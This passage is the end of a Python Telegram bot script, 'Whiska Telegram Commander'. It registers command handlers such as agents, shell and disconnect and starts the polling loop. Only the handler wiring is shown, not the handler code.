    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("agents", cmd_agents))
    app.add_handler(CommandHandler("shell", cmd_shell))
    app.add_handler(CommandHandler("back", cmd_back))
    app.add_handler(CommandHandler("refresh", cmd_refresh))
    app.add_handler(CommandHandler("disconnect", cmd_disconnect))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    log.info("Whiska Telegram Commander starting — polling for updates...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
